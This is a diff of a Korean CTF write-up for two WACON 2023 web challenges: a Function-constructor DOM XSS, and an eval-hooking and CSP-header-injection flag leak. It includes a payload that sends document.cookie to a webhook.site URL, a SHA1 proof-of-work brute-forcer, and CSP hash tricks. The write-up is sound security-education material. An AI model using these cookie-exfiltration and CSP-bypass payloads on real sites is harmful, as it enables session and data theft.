@@ -9,7 +9,7 @@ tags: [CTF]
 
 ### TL;DR
 
-> JavaScript의 Function 생성자 함수에서 값을 처리할때 발생하는 예외와 JS 스크립트에서 인식하는 예외의 차이의 다름을 이용한 챌린지입니다.
+> XSS 문제로, Function 함수에서 강제로 잘못된 변수명 에러를 유발하여 DOM XSS 취약점을 발생 시키는 챌린지 입니다.
 
 ### Description
 
@@ -42,192 +42,56 @@ tags: [CTF]
 </head>
 ```
 
-챌린지 파일의 index.html을 확인해보면 위와 같은 코드가 존재하는 것을 확인할 수 있습니다.
+제공하는 파일 내용에서는 ``document.location.hash.slic(1)``으로 입력을 받을 수 있으며, ``greater than sign( < )`` , ``less than sign ( > )``을 replace 합니다.
 
-문제에서 "plz xss"와 script 태그에서 특정 조건을 통과해 XSS를 발생시켜야하는 문제라고 추측이 가능합니다.
-
-먼저 paload 변수에 값을 할당하는 부분을 확인해보겠습니다.
-
-```js
-decodeURIComponent(document.location.hash.slice(1)).replaceAll(/<>/g,'');
-```
-
-현재 URL의 fragment 값을 받아와서 "<", ">" 태그문자가 존재하면 이를 제거한 후 URL Decoding을 진행합니다, 
-그 후 payload라는 변수에 decode된 URL 값을 저장합니다.
-
-그 이후, 예외처리문을 실행합니다.
+입력된 페이로드는 ``Function()`` 함수 안에 인자로 들어가고 만약 에러가 발생 된다면 catch 으로 넘어가, DOM XSS 취약점을 발생시킬 수 있도록 유도합니다.
 
 ```js
 try{
-    Function(payload);
+	Function(payload);
 } catch(e){
-    let scriptEl = document.createElement('script');
-    scriptEl.innerText = payload;
-    document.body.appendChild(scriptEl);
+	let scriptEl = document.createElement('script'); // create script element
+	scriptEl.innerText = payload; // script tag inner HTML In payload
+	document.body.appendChild(scriptEl); // Adding script Element
 }
 ```
 
-Function 생성자 함수에 해당 payload 변수의 값을 인자로 넣어 예외처리문으로 감쌉니다.
+위와 같은 코드에서 catch만 보면 script 태그 안에 원하는 페이로드를 넣을 수 있는 아주 간단해 보이는 문제입니다.
 
-만약 Function 생성자 함수에서 값을 처리하는 도중 예외가 발생하면, script 태그를 생성하고 innerText 문으로 해당 payload를 넣어주게됩니다.
-
-즉, Function 생성자 함수에서 값을 처리할때는 예외가 발생해야하고, innerText로 payload가 저장되어 스크립트가 실행되는 과정에서는 예외가 발생해서는 안됩니다.
-
-이를 통해 XSS를 트리거 시키게된다면 아래와 같은 bot 서버에서 해당 payload를 요청해 해당 URL을 방문하게 할 수 있습니다.
-
-index.js를 확인해보면 bot 요청을 처리하는 코드를 확인할 수 있습니다.
+Function 함수 안에 들어가는 payload는 에러를 유발하기 위해 아래와 같이 잘못된 변수 이름을 통해 발생되는 에러를 사용했습니다.
 
 ```js
-app.post('/report',(req,res)=>{
-	let gresp = req.body['g-recaptcha-response']?.toString();
-	let url = req.body.url?.toString();
-
-	res.type('text/plain');
-	if(gresp && url && (url.startsWith('http://') || url.startsWith('https://'))){
-		fetch(`https://www.google.com/recaptcha/api/siteverify?secret=${captchaSecret}&response=${encodeURIComponent(gresp)}`, {
-	        method: 'POST'
-	    }).then(response => response.json()).then(r => {
-	    	if(r.success == true){
-				childProcess.spawn('node',['./bot.js',JSON.stringify(url)]);
-    			res.send('Admin will visit!');
-	    	} else {
-				res.send('Captcha failed i guess');
-	    	}
-	    }).catch(error => res.send('Unknown error??'));
-	} else {
-		res.send('Bad params');
-	}
-});
+let 23a; // 앞에 숫자는 잘못된 변수 명 규칙입니다.
 ```
 
-요약해보면 캡챠를 통해 현재 bruteforce 공격을 방지하고, url이 http:// 또는 https://로 시작하는지 검사합니다.
-
-검사에 통과하게 된다면, bot.js에 전달 받은 url 값을 인자로 넣어 서버를 실행하고 "Admin will visit!" 이라는 메시지를 반환합니다.
-
-여기서 bot.js는 전달받은 url 인자를 아래와 같이 처리하게됩니다.
+script 태그에 들어갔을 때 원하는 페이로드가 실행 된 다음 에러가 발생하게 만들어주면 됩니다.
 
 ```js
-#!/usr/bin/env node
-const puppeteer = require('puppeteer')
-
-const flag = process.env.FLAG || 'WACON2023{test-flag}';
-
-async function visit(url){
-	let browser;
-
-	if(!/^https?:\/\//.test(url)){
-		return;
-	}
-
-	try{
-		browser = await puppeteer.launch({
-		    pipe: true,
-		    args: [
-		        "--no-sandbox",
-		        "--disable-setuid-sandbox",
-		        "--js-flags=--noexpose_wasm,--jitless",
-		        "--ignore-certificate-errors",
-		    ],
-		    executablePath: "/usr/bin/google-chrome-stable",
-		    headless: 'new'
-		});
-
-		let page = await browser.newPage();
-
-		await page.setCookie({
-			httpOnly: false,
-			name: 'FLAG',
-			value: flag,
-			domain: 'web',
-			sameSite: 'Lax'
-		});
-
-		page = await browser.newPage();
-		await page.goto(url,{ waitUntil: 'domcontentloaded', timeout: 2000 });
-		await new Promise(r=>setTimeout(r,3000));
-	}catch(e){ console.log(e) }
-	try{await browser.close();}catch(e){}
-	process.exit(0)
-}
-
-visit(JSON.parse(process.argv[2]))
+alert(1);%0alet 23;
 ```
 
-해당 코드에서도 url이 http://, 또는 https://로 시작하는지 검자를 먼저 진행합니다.
-
-그 후 puppeteer 모듈을 사용해서 browser를 열게 됩니다. 해당 브라우저에서 접속하기 전 cookie를 설정합니다.
+하지만 단순히 줄바꿈으로 하기에는 innerHTML에서는 ``\n``을 ``<br>`` 태그로 치환하기 때문에 주석을 이용하여 무시하면 됩니다.
 
 ```js
-await page.setCookie({
-    httpOnly: false,
-    name: 'FLAG',
-    value: flag,
-    domain: 'web',
-    sameSite: 'Lax'
-});
+// ex,
+// <payload>//%0alet 23a;
+
+alert(1);//%0alet 23a;
 ```
 
-cookie를 설정하면, FLAG라는 키라는 쿠키를 생성하고 process.env에 존재하는 flag 값을 쿠키 값으로 설정하게됩니다.
-
-그 이후 전달받은 url 파라미터를 실제로 flag 쿠키가 설정된 browser에서 방문하게됩니다.
-
-정리히면 일단 XSS를 조건에 맞게 트리거 시킨 후 bot으로 요청하게한다면 bot이 해당 url을 방문하면서 동일하게 xss가 트리거 되고, flag 쿠키 값을 공격자의 서버로 전달시키도록 할 수 있습니다.
-
-### Payload
-
-먼저, Function 생성자 함수는 인수로 전달받은 값을 함수로 변환하는 작업을 진행합니다.
-
-예를 들어서 alert(1)이라는 문자를 Function 생성자 함수로 전달하게 된다면, 이를 함수로 만들기 위해 변환하려고 시도합니다. 만약 변환이 실패하게 된다면 오류가 발생됩니다.
-
-하지만 Function 생성자 함수는 상대적으로 오류에 대해 관대하고, 왠만한 오류는 그냥 무시하고 예외를 발생시키지 않습니다. (null.obj() 를 Function 생성자 함수의 인자로 보내주게 된다면 이를 에러로 발생시키지 않습니다.)
-
-여러가지 방법을 생각해봤을때 주석(개행)을 사용하게 된다면 Function 함수에서는 에러를 발생시키고, 스크립트를 실행시킬 수 있습니다.
-
-```js
-alert(1)
-//
-let 2as
-```
-
-아래와 같은 payload를 확인해보겠습니다.
-
-```js
-alert(1);//%0alet 24a
-```
-
-먼저 let 24a는 javascript의 변수 명명 규칙을 위반하는 생성방법입니다. (숫자가 변수명의 맨 앖에 위치할 수 없습니다.)
-
-Function 생성자함수는 해당 규칙을 위반하였음으로 오류를 발생시키게됩니다, 하지만 오류가 발생하고 innerText로 payload가 삽입될 때에는 %0a라는 개행문자가 무시되고 결과적으로 let 24a라는 문자가 주석처리됩니다.
-
-아래와 같은 원리로 동작합니다.
-
-```
-payload = "alert(1);//%0alet 23a";
-
-Function(payload) -> %0a(\n) alert(1); // \n let 23a -> "Error"
-
-element.innerText = payload -> alert(1) // let 23a -> "Ok"
-```
-
-해당 payload를 그대로 챌린지 사이트에 넣고 실행해보면 XSS가 트리거되는 것을 알 수 있습니다.
+그렇다면 위와 같은 페이로드가 완성되고 ``url.kr#<payload>//%0alet 23a;``와 같이 보내주면 XSS 트리거에 성공하게 됩니다.
 
 ![Alt text](https://blog.kakaocdn.net/dn/C5euO/btsv7Bh8RQq/Na1rA2b3WEnBkCF6xirqF1/img.png)
 
-이를 이용해서 webhook을 이용해 사이트의 쿠기값을 보내게하는 코드를 작성하게 된다면, bot으로 요청을 보냈을 때 webhook으로 저장된 flag 쿠키가 보내지게 될 것입니다.
-
 ### Exploit
 
-요구조건에 맞는 Exploit payload를 아래와 같이 작성합니다.
+위와 같은 페이로드를 보내기 위해 COOKIE를 탈취하는 페이로드를 작성하면 됩니다.
 
 ```js
 location.href="https://webhook.site/b1d8c7e2-0203-453e-b7c6-8d36d365655c/?"+document.cookie;//%0alet 23a
 ```
 
-해당 payload를 bot으로 보내게 된다면 성공적으로 Exploit에 성공하여, FLAG를 얻을 수 있습니다.
-
-여기서 주의할점은 방문할 URL의 host를 bot 서버의 host로 지정해주어야 성공적으로 cookie값을 읽어올 수 있습니다.
-
-docker-compose 파일을 확인해보면 어디로 요청을 보내야 FLAG 쿠키를 읽을 수 있는지 알 수 있습니다.
+FLAG를 탈취 하려고 하는 URL은 docker-compose.yml에 있는 것 처럼 ``http://web`` 이므로
 
 ```yml
 version: "3.9"
@@ -250,16 +114,11 @@ services:
       - ./app/nginx.conf:/etc/nginx/conf.d/default.conf:ro
 ```
 
-해당 payload가 성공적으로 작동하기위해서는 챌린지의 서버로 요청을 보내야하는데, 도메인이 "web"인 것을 알아낼 수 있습니다.
-
-그러면 payload를 아래와 같이 구성해주어야합니다.
+다음과 같은 DNS로 맞춰 report를 보내주면 됩니다.
 
 ```js
-http://web/#location.href="
-https://webhook.site/b1d8c7e2-0203-453e-b7c6-8d36d365655c/?"+document.cookie;//%0alet 23a
+http://web/#location.href="https://webhook.site/b1d8c7e2-0203-453e-b7c6-8d36d365655c/?"+document.cookie;//%0alet 23a
 ```
-
-webhook을 확인해보면 성공적으로 FLAG 쿠키를 읽어온 것을 볼 수 있습니다.
 
 ![Alt text](https://blog.kakaocdn.net/dn/cImwnR/btsv9LxzDmD/O9reMfu4Ncc84kSk0fcSx1/img.png)
 
@@ -269,7 +128,7 @@ webhook을 확인해보면 성공적으로 FLAG 쿠키를 읽어온 것을 볼 �
 
 ### TL;DR
 
-> Eval Hooking 또는 CSP Bypass를 이용한 챌린지입니다.
+> JS에서 eval function hooking 또는 CSP Header Overwrite으로 FLAG를 탈취하는 문제입니다.
 
 ### Description
 
@@ -277,15 +136,13 @@ webhook을 확인해보면 성공적으로 FLAG 쿠키를 읽어온 것을 볼 �
 > 
 > Note: The web server is running on 80 port inside the docker. (8000 => 80)
 
-### Analyzsis
+### Analysis
 
 챌린지 사이트에 처음 접속해보면 아래와 같은 페이지를 확인해볼 수 있습니다.
 
 ![Alt text](https://blog.kakaocdn.net/dn/dNB18q/btsv0vW8bu7/hKbJufIAOzHAruzc1Knvk0/img.png)
 
-script와 header, pow라는 3가지의 입력값을 받고 있는 것을 확인해볼 수 있습니다.
-
-여기서 값을 입력하고 Submit 버튼을 누르게된다면 submit.php로 입력한 값들이 전달되게됩니다.
+Your Script, Single header line, Solve Pow 이렇게 3가지를 입력하게 되면 아래의 PHP 코드로 이동 됩니다.
 
 ```php
 <?php
@@ -329,23 +186,10 @@ $param = escapeshellarg($key);
 exec("node /app/bot.js {$param}");
 ```
 
-먼저, 입력한 값들이 모두 비어있지 않은지 검사를 진행하고, 비어있지 않다면 check_pow 함수를 이용해 입력받은 pow를 검사하는 작업을 진행합니다.
 
-pow 검사를 통과하면 gen_pow 함수를 실행시키고 입력받은 header와 script 값을 hex로 변환한 후 재할당을 진행합니다.
+Pow을 이용하여 검증을 한 다음에 입력한 header와 script가 그대로 ``"./data".sha1($SALT.$key)`` 파일에 저장합니다.
 
-그리고 filename에 사용될 키를 생성하게 되는데, 해당 키는 랜덤한 32바이트의 sha1 인코딩을 진행한 값입니다.
-
-해당 filename을 key라는 변수에 저장하고 $SALT라는 기본값과 $key 값을 더해 sha1 인코딩을 진행한 값을 filename으로 사용합니다.
-
-그리고 파일이 존재하지 않으면 위와 같은 작업으로 파일이름을 생성하고 파일이 정상적으로 생성되었는지 확인한 후 do ... while 문을 종료합니다.
-
-그 후, 생성된 파일명으로 아까 hex로 변환한 header와 script 값을 개행을 이용해 구분하여 파일 값으로 저장하게됩니다.
-
-이와 같은 작업이 모두 끝나게 된다면 랜덤하게 생성된 $key 값을 escapeshellarg 함수를 이용해 command injection을 방지합니다.
-
-마지막으로 node /app/bot.js 파일로 이스케이프된 $key 값을 전달합니다.
-
-bot.js에서는 아래와 같은 작업을 진행합니다.
+그런 다음, ``랜덤 바이트 + 시간 + 랜덤 바이트`` sha1 encrypt 한 값을 node /app/bot.js에 파라미터로 넘겨줍니다.
 
 ```js
 const puppeteer = require('puppeteer');
@@ -371,13 +215,9 @@ const url = "http://localhost/run.php?key=" + key;
 })();
 ```
 
-해당 코드에서 key는 process.argv[2] (명령라인에서 2번째 인자 ($key 변수 값과 매칭))를 사용합니다.
+bot.js 파일에서는 입력 받은 $key를 ``http://localhost/run.php?key=`` 으로 파라미터를 넣고 페이지에 접속하는 것을 볼 수 있습니다.
 
-그리고 저장된 key를 이용해서 "http://localhost/run.php?key="+key로 요청을 보냅니다.
-
-URL로 요청을 보낼 때 puppeteer 모듈을 이용하여 새로운 브라우저를 생성한 후 해당 브라우저에서 URL을 방문하도록 합니다.
-
-이제 이렇게 전달받은 key를 run.php에서 어떻게 처리해야하는지 확인해봐야합니다.
+#### run.php
 
 ```php
 <?php 
@@ -464,21 +304,47 @@ header($header, false);
 </html>
 ```
 
-요약해서 설명하면, 가장 먼저 CSP와 랜덤한 값의 nonce가 설정됩니다.
+해당 문제에서 run.php 파일이 핵심인데 분석을 진행 하겠습니다.
 
-그 이후 bot.js로부터 전달받은 key와 $SALT 값을 더해 sha1 인코딩을 진행한 후 해당 파일명과 해당하는 파일이 존재하는지 확인합니다.
+랜덤 값이 들어간 nonce를 script-src에 걸어준 다양한 정책이 존재하는 CSP 헤더를 생성 합니다.
 
-파일이 존재한다면 해당 파일을 열고, $contentdata에 파일 내용을 저장한 다음 unlink 함수로 해당 파일을 삭제합니다.
+그리고 아까 file_put_contents 으로 ``$header\n$script`` 내용이 들어간 파일을 읽고 난 다음 각각 $header, $script 변수에 넣어주는 것을 볼 수 있습니다.
 
-그리고 파일이 삭제되었는지 확인을 진행한 후, $contentdata를 \n 기준으로 split을 진행합니다.
+```php
+$nonce = substr(sha1(random_bytes(32)), 16);
+// 랜덤 $nonce 
 
-아까 $header\n$script 순으로 파일 내용을 저장하였음으로 똑같이 개행문자를 기준으로 split을 진행하여 $header와 $script 값을 가져온 후 이를 hex2bin 을 이용해 원래의 ascii로 되돌리는 작업을 진행합니다.
+header("Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' 'nonce-$nonce'; base-uri 'none'; connect-src 'none';" );
+// CSP 헤더 생성
 
-ascii로 값들이 복원되어 저장되었다면 $header 변수에 있는 값을 header 함수의 인수로 사용합니다, 이때 header 함수의 2번째 인수가 false로 설정되어있음으로 http 헤더가 중복으로 설정될 경우 기존 값을 유지하면서 새로운 값을 추가하도록 합니다.
+$key = isset($_GET["key"]) ? $_GET["key"] : "NOPE";
+if ($key === "NOPE") {
+    die("no");
+}
 
-기본 설정작업이 끝나면 nonce 값을 이용해 script가 실행되도록 합니다.
 
-가장 먼저 실행되는 script는 아래와 같습니다.
+$key = sha1($SALT.$key);
+$contentfile = "./data/$key";
+if (!file_exists($contentfile)) {
+    die("no");
+}
+
+$contentdata = file_get_contents($contentfile); // 아까 $header\n$script 으로 저장했던 파일 읽어오기
+
+unlink($contentfile);
+if (file_exists($contentfile)) { 
+    die("no");
+}
+
+$data = explode("\n", $contentdata);
+
+$header = hex2bin(trim($data[0])); // header
+$script = hex2bin(trim($data[1])); // script
+
+header($header, false); // 새로운 헤더 생성
+```
+
+그런 다음 $header을 그대로 header 함수에 넣어서 우리가 입력한 값으로 원하는 헤더를 생성합니다.
 
 ```php
 <script nonce="<?=$nonce?>">
@@ -487,9 +353,11 @@ ascii로 값들이 복원되어 저장되었다면 $header 변수에 있는 값�
 </script>
 ```
 
-사용자가 파일에서 입력했던 $script 값을 그대로 사용하는 것을 확인할 수 있습니다.
+그리고 $script 변수는 제일 하단에 있는 script 태그에 그대로 넣어 XSS에 취약하도록 만듭니다.
 
-2초뒤에는 아래와 같은 script가 실행됩니다.
+이로써, $header 변수는 원하는 헤더를 생성 시키고, $script는 원하는 JS 코드를 작성할 수 있다는 것을 알 수 있습니다.
+
+---
 
 ```php
 <div id="flag_container">
@@ -523,15 +391,14 @@ ascii로 값들이 복원되어 저장되었다면 $header 변수에 있는 값�
     </script>
 </div>
 ```
-먼저 teseter와 tmp 값을 설정한 후, $FLAG의 길이만큼 반복을 진행합니다. 이때 레이스컨디션이 발생하지 않도록 반복문과 tmp 값을 이용해 설정해주고 있는 것을 확인할 수 있습니다.
 
-그리고 tester 값을 0으로 설정한 후 eval 함수를 이용해 tester 값을 1로 변경합니다.
+다음으로, 중간에 있는 script 태그를 살펴보면 $FLAG의 길이만큼 반복하면서 ``// never pollute eval`` 주석에 있는 부분에서 ``tester === 1``을 이용해 eval 함수가 제대로 작동 하는지 테스트 합니다.
 
-만약에 eval이 작동하지 않아 tester 값이 0일경우는 return으로 코드를 실행하지 않습니다.
+그렇게 정상적으로 실행이 되면 마지막에는 eval 함수에 ``////////////// ... $flag[<?= $i ?>] = <?= $FLAG[$i] ?>`` 주석을 넣고 $flag 코드가 ``$flag[0] = "W"`` 이런 식으로 들어가도록 실행 되는 것을 알 수 있습니다.
 
-조건이 통과하게 된다면 한번더 레이스컨디션 방지 코드가 실행된 후 eval로 주석처리된 $flag[$i] = $FLAG[$i]와 같이 $FLAG 값의 문자를 1문자씩 주석처리를 진행 후 eval로 실행하는 것을 확인할 수 있습니다.
+하지만 주석 처리 되기 때문에 단순히 JS 코드 단에서 주석으로 ``$FLAG[$i]``가 들어가기만 합니다.
 
-이와 같은 작업이 실행되고 난 후, 아래의 script가 실행되어서 settimeout 스크립트가 실행되는 컨테이너를 지워버립니다.
+--
 
 ```php
 <script nonce="<?=$nonce?>">
@@ -543,13 +410,15 @@ ascii로 값들이 복원되어 저장되었다면 $header 변수에 있는 값�
 </script>
 ```
 
-해석하면 flag_container로 2초 뒤에 1문자씩 $FLAG의 값을 주석처리한 eval를 실행한 후 완료되면 해당 flag_container를 바로 삭제해버리는 코드입니다.
+마지막으로, 다른 script 태그를 보면 위에서 eval 함수를 실행 시키고 $FLAG를 주석에 하고 등등 다양한 코드를 실행 한 다음
+
+flag_container을 document.body에서 removeChild를 수행하여 flag_container id를 가지고 있는 HTML 태그를 없애버리고
+
+window.setTimeout, window.setInterval을 null로 만들게 됩니다.
 
 ### Pow Leak
 
-일단 먼저, header나 script를 실행시키기 위해서는 pow를 맞춰야합니다.
-
-아래는 config.php의 pow 설정 방법입니다.
+이제 어느정도 분석을 했으니 요청을 하기 위해 Pow 코드를 분석 하겠습니다.
 
 ```php
 <?php
@@ -581,21 +450,10 @@ function check_pow($input) {
     return $check === $_SESSION["pow_answer"];
 }
 ```
-config.php 코드에서는 챌린지의 FLAG와 SALT를 지정해놓습니다, 그 후 pow를 생성하고 검증하는 함수를 정의합니다.
 
-gen_pow 함수에서는 pow를 생성하는 함수를 정의합니다, 5자 길이의 랜덤한 ascii 문자의 pow를 생성합니다.
+해당 gen_pow 함수에서는 $nonce, $check 두개의 랜덤 값을 sha1 encrypt하여 $_SESSION["pow_answer"]에 넣어주는데, sha1은 이미 다른 값으로도 똑같은 해쉬를 만들어낼 수 있는 안전하지 않은 알고리즘이다.
 
-pow를 생성할때 nonce와 check라는 값을 생성하는데, nonce의 길이와 check의 길이는 5자로 고정입니다.
-
-nonce와 check를 더해서 sha1 encrypt를 진행한 값을 pow_answer로 지정합니다.
-
-그 이후, check_pow 함수에서는 입력받은 pow를 검증하는 작업을 진행합니다, 입력받은 pow를 phpsession에 저장되어있는 pow_nonce와 더해서 sha1을 encrypt를 진행한 값이 pow_answer와 일치하는지 확인한 후 boolean을 반환합니다.
-
-챌린지에서는 사전에 pow_nonce와 pow_answer 값을 알려줍니다.
-
-그러면 알려진 pow_nonce와 5자 길이의 생성된 check 값을 더한 후 sha1을 진행해 pow_answer와 일치하는지 비교하는 bruteforce 코드를 작성해서 숨겨진 pow_check 값을 알아낼 수 있습니다.
-
-현재 랜덤하게 생성되는 아스키 문자열의 길이는 약 35 정도입니다. 이를 5번 매칭한다고 진행했을때 35의 5제곱만큼 반복한다면 check_pow를 알아낼 수 있습니다. (약 6천만번)
+때문에 ``sha1($_SESSION["pow_nonce"]. $input)``이 $_SESSION["pow_answer"]와 똑같은 해쉬가 나올 수 있도록 무차별 대입을 진행하면 됩니다.
 
 ```python
 import hashlib
@@ -637,26 +495,20 @@ for brute in itertools.product(ascii, repeat=5):
         break
 ```
 
-gen_pow함수가 계속실행된다면 브루트포스를 이용해서도 check_pow값을 알아낼 수 없겠지만 처음 index.php를 접속할때와 submit.php를 진행할때는 pow값이 동일하기 때문에 브루트포싱을 할 수 있습니다.
-
-위 Exploit 코드와 같이 index.php의 페이지에서 nonce와 hash을 가져온 후 내부적으로 브루트포스를 통해 check_pow를 leak을 진행하면 pow를 알아낼 수 있습니다.
-
-이렇게 pow를 얻어내면, 이제 script와 header 값을 통해 공격을 진행할 수 있습니다.
+itertools.product 함수를 이용하여 nonce + check 해쉬가 일치할 때 까지 반복하여 찾아내면 됩니다.
 
 ### Scenario
 
-해당 챌린지의 공격 방법은 총 2가지가 존재합니다.
+해당 챌린지의 공격 방법은 총 2 단계가 존재합니다.
 
 ```
-1. eval 함수 후킹
-2. CSP Bypass & HTML Leak
+1. eval Function Hooking
+2. CSP Bypass
 ```
 
-### 1. eval 함수 후킹
+### 1. eval Function Hooking
 
 가장 간단하게 챌린지를 해결할 수 있는 방법입니다.
-
-아래와 같이 $FLAG 문자를 주석처리 후 실행할때 eval 함수를 사용하는 것을 알 수 있습니다.
 
 ```php
 <div id="flag_container">
@@ -684,9 +536,10 @@ gen_pow함수가 계속실행된다면 브루트포스를 이용해서도 check_
 </div>
 ```
 
-그러면 eval 함수를 재정의해서 eval 함수를 호출할때 tester 값만 조작할 수 있다면 eval 함수를 다른 목적으로 동작하도록 사용할 수 있습니다.
+먼저, $script와 $header 값을 우리가 입력할 수 있고 $script 태그를 이용하여 JS 코드를 실행합니다.
 
-예를 들어서 eval 함수가 현재는 입력받은 문자열을 javascript 코드로 실행하는 것이지만 아래와 같이 정의한다면 다르게 동작하게됩니다.
+하지만 window.setTimeout으로 인해 2000ms 정도 delay를 가진 다음 플래그 값이 포함된 eval 함수를 실행하게 됩니다.
+
 
 ```js
 eval = (data) => {
@@ -694,51 +547,9 @@ eval = (data) => {
 }
 ```
 
-위와 같이 eval 함수를 재정의하게 된다면 아래와 같은 코드를 실행할때 javascript 코드로 실행하는것이 아닌 console에 값이 출력되게 됩니다.
+그러면 window.setTimeout으로 인해 늦게 실행되고, 원하는 JS 코드를 실행 할 수 있다는 점을 이용하여 eval 함수를 재정의해서 Hooking을 진행하면 되는 것을 알 수 있습니다.
 
-```js
-eval("// hello world"); -> console.log("hello world")
-```
-
-이를 이용해서 후킹으로 FLAG 값을 얻어내는 방법이 존재합니다.
-
-### 2. CSP Bypass & HTML Leak
-
-현재 챌린지에서는 header 함수를 이용해서 http 해더를 추가하거나 수정할 수 있습니다.
-
-run.php는 현재 CSP가 아래와 같이 설정되어있습니다.
-
-```php
-header("Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' 'nonce-$nonce'; base-uri 'none'; connect-src 'none';" );
-```
-
-하지만 입력한 $header 값을 이용해 http 헤더를 추가로 설정하거나 수정할 수 있습니다.
-
-```php
-header($header, false);
-```
-
-현재 header 함수의 두번째 인자가 false로 설정되어있습니다, 이는 http 헤더가 중복 선언될 경우, CSP는 더 높은 보안의 헤더를 적용하고, 만약 현재 설정되지 않은 값을 추가할 경우 기존 http 헤더 설정에서 값을 추가로 설정할 수 있습니다.
-
-```
-Content-Security-Policy: default-src 'none';
-
-Content-Security-Policy: default-src 'none'; script-src: 'unsafe-eval'
-
--> Content-Security-Policy: default-src 'none'; script-src: 'unsafe-eval'; (추가로 설정이 적용됨)
-```
-
-이를 활용하게 되면 nonce 값을 추가할 수 있습니다, CSP의 nonce를 추가하게된다면 기존의 script 태그의 nonce는 추가된 nonce 값과 일치하지 않아 실행되지 않습니다.
-
-스크립트가 실행되지 않으면 run.php에서 flag_container를 지우는 코드가 실행되지 않아 FLAG 값이 그대로 HTML상에 남게 되어있어 Leak을 진행할 수 있습니다. 
-
-HTML Leak을 진행하고 난 후 위의 설정되어 있는 CSP를 우회하게 된다면 성공적으로 FLAG 값을 읽어올 수 있습니다.
-
-### Challange Payload & Exploit (Hooking Eval)
-
-먼저 사용되는 방법으로는 eval 함수를 재정의하여 후킹하는 방법이 존재합니다.
-
-하지만 한가지 문제가 존재합니다. 아래와 같은 코드로 인해 eval 함수를 재정의 하는데에 어려움을 겪었습니다.
+위와 같이 재정의를 하게 되면 eval 함수 안에 들어가는 값을 원하는대로 조작을 할 수 있게 됩니다.
 
 ```php
 <div id="flag_container">
@@ -845,7 +656,13 @@ function myFunc() {
     if (myFunc.caller === null) {
         console.log("The function was called from the top!");
     } else {
+
         let scripts = myFunc.caller.toString();
+
+        if(strings == "tester = 1"){
+            var tester = 1;
+        }
+
         let reg = new RegExp(/eval\(\"\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\$flag\[[0-9]+\] = (.+)\"\)/g);
 
 
@@ -957,50 +774,59 @@ print(res2.text)
 
 #### FLAG : ``WACon2023{b6ee5fc687a677bb1baf7285dca31b675f68c9d7e6ddd8a92b84d54d41729d5e}``
 
-### Challange Payload && Exploit (HTML Leak && CSP Bypass)
+### 2. CSP Bypass
 
-두번째 방법으로는 $header 변수를 이용해서 HTML Leak과 CSP Bypass를 진행하여 FLAG를 얻는 방법입니다.
+CSP Bypass 방법에서는 flag_container id를 가지고 있는 div 태그 안에 있는 script 태그에 FLAG 내용이 전부 들어있기 떄문에
 
-이를, 진행하기 위해서는 아래의 함수를 적극적으로 활용하여야합니다.
+CSP 헤더 조작을 이용하여 script 태그 내용을 전부 탈취하는 방법입니다.
 
-```php
-header($header, false);
-```
-
-위 함수를 활용하면 동일한 HTTP 헤더를 선언하여 값을 추가할 수 있습니다, 
-이때 CSP 헤더를 설정할때 script-src 부분에서 nonce값이 현재 설정되어있는 상황해서 위 header 함수를 이용해서 nonce를 추가로 설정할 수 있습니다.
-
-현재 설정되어 있는 CSP 해더는 아래와 같습니다.
+먼저 CSP 헤더를 보겠습니다.
 
 ```php
 header("Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' 'nonce-$nonce'; base-uri 'none'; connect-src 'none';" );
+
+[ ... ]
+
+header($header, false);
 ```
 
-아래는 현재 설정된 CSP에서 nonce 값을 추가로 설정하는 예시입니다.
+$header 함수를 원하는대로 입력할 수 있다는 점을 이용하여 새로운 헤더를 생성할 수 있는데, header 함수의 두 번째 인자가 false으로 되어 있다면 기존에 있는 헤더를 덮어쓰기 할 수 있습니다.
 
+그러면 단순하게 CSP 헤더를 덮어쓰면서 XSS 취약점을 발생시켜 script 태그 내용을 가져오기에는 아래와 같이 flag_container을 아에 삭제해버리는 문제가 발생합니다.
+
+```html
+<script nonce="<?=$nonce?>">
+    (() => { 
+        let flag_container = document.getElementById("flag_container");
+        document.body.removeChild(flag_container);
+        window.setTimeout = window.setInterval = null;
+    })();
+</script>
+
+<script nonce="<?=$nonce?>">
+    // User code goes here
+    <?= $script ?>
+</script>
 ```
-기존 CSP
--> Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' 'nonce-asdovkdoaasdkaosdko'; base-uri 'none'; connect-src 'none';
 
-header("Content-Security-Policy: script-src 'sha256-S9T+4pxwdCdgDuhSdqdsTSI3li/BHqci69Oa+iw6p7k=';", false);
--> Content-Security-Policy: script-src 'sha256-S9T+4pxwdCdgDuhSdqdsTSI3li/BHqci69Oa+iw6p7k=';
+그렇다면 위에 있는 flag_container id의 tag를 삭제하는 코드는 실행하지 않고, 우리가 입력한 아래의 script 태그가 실행 되도록 만들어야 됩니다.
 
-실제 적용되는 CSP
--> Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' 'nonce-asdovkdoaasdkaosdko' 'sha256-S9T+4pxwdCdgDuhSdqdsTSI3li/BHqci69Oa+iw6p7k='; base-uri 'none'; connect-src 'none';
+때마침 CSP 헤더에서는 script-src 정책을 이용하여 리소스 로드를 차단하는 방법은 hash ( sha-N ), nonce('nonce-N') 2가지 방법이 존재합니다.
+
+```php
+header("Content-Security-Policy: script-src 'nonce-123'");
+// script 태그의 nonce 속성이 123이 아니면 리소스 로드 차단
+
+header("Content-Security-Policy: script-src 'sha256-RFWPLDbv2BY+rCkDzsE+0fr8ylGr2R2faWMhq4lfEQc='");
+// JS 전체 Code Block을 SHA-256 해쉬와 한 값과 CSP 헤더의 sha256과 일치하지 않으면 리소스 로드 차단
 ```
 
-위와 같이 CSP에서 nonce 같은 경우 보안 우선순위를 가릴 수 없이 때문에 nonce 값이 하나만 적용되는 것이 아닌 둘 다 적용됩니다.
+이렇게 2가지의 검증 방법을 이용하여 flag_container를 삭제하는 코드와 일치하지 않는 sha256 해쉬를 넣어주면 실행이 되지 않을 것이고
 
-즉, script 태그에서, nonce가 하나만 만족하여서는 script가 실행이 되지 않고, 추가로 설정된 nonce까지 만족하여야 script가 실행됩니다.
+아래 우리가 입력할 페이로드를 sha256 해쉬를 알아낸 다음 CSP 헤더에 추가하여 트리거를 하면 입력한 페이로드만 실행이 됩니다.
 
